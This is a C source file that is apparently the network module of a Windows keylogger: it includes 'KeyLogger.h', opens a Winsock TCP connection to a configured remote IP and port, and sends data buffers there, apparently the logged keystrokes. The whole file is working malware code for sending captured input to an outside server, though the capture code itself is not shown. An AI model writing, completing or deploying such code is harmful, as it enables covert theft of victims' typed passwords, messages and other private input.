#include "KeyLogger.h"

SOCKET connectSocket = INVALID_SOCKET;

int sendData(char* buff) {

	SIZE_T sResult, bSize = strlen(buff);

	char tmp[2] = "x";

	int i = 0;

	sResult = send(connectSocket, buff, bSize, 0);
	

	// MAY NEED FOR SOME SERVER SOCKET IMPLEMENTATION
	/*for (int j = 0; j < bSize; j++) {

		tmp[0] = buff[j];
		sResult = send(connectSocket, tmp, 1, 1);
	}*/

	if (sResult < 0) {
		printf("Send data to server failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	return 0;

}

int initSocket() {

	WSADATA wsaData;

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Initialized WinSock\n");

	
	connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connectSocket == INVALID_SOCKET) {
		printf("Creating socket failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Socket created successfully\n");

	struct sockaddr_in server;
	server.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT_NUMBER);

	// connect to remote server
	int cResult = connect(connectSocket, (struct sockaddr*)&server, sizeof(server));

	if (cResult < 0) {
		printf("Connect to server failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Scoket connnected successfully\n");

	return 0;
}

int closeSocket() {

	closesocket(connectSocket);
	WSACleanup();
	return 0;
}